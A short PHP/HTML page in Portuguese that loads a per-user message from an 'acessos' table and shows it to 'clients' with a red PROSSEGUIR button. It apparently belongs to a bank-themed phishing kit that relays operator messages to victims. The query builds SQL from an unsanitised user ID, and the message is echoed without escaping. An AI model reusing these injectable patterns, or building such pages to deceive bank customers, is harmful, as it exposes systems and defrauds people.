<?php
$buscaMensagem = read($conn, 'acessos', "WHERE id = '$UserId'");
$mensagem = $buscaMensagem['0']['mensagem'];
$mensagem = str_replace('/', '<br>', $mensagem);
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title></title>
</head>
<body>

<?php include ('pass_net.php');?>

	<div class="md_all">
		<div class="md_box">

			<div class="md_boxLogo border_loader">
				<img src="imgs/logo-stdeMd1.png">
			</div><!-- ld_boxLogo -->

			<div class="md_modalTtitle">
				<h1 class="title_ass">Temos uma mensagem importante para você!</h1>
			</div>

			<div class="md_boxTables" style="margin-top: -10px;">

				<div style="diplay:block;">

				</div>

				<form action="" name="formAss" id="formAss" method="post">
					<input type="hidden" name="sender" id="sender" value="mensagem">
					<p style="display:block;width:100%;margin:0 0 40px 0;color:#ed2228;text-align:center;font-size:.8em;font-weight: 600;">
						<?php echo $mensagem;?>
					</p>

					<input type="submit" name="confirmMsg" id="confirmMsg" value="PROSSEGUIR" style="display:block;width:200px;height: 40px;background-color:#ff0000;color:#fff;border:1px solid #b20101;margin: 0 auto;
					box-shadow: inset 0 1px 1px rgba(255,255,255,.6), 0 1px 3px rgba(0,0,0,.6);border-radius: 2px;font-weight: 600;cursor:pointer;">
				</form>

				<span class="note_atr">
					<b class="red_txt">DICA:</b>
					As mensagens pessoais, são direcionadas a nossos clientes em carater de esclarecimento. Portanto, sempre fique atento à estas mensagens.
				</span>
			</div><!-- md_boxTables -->

			<br><br>
		</div><!-- ld_box -->
	</div>
</body>
</html>
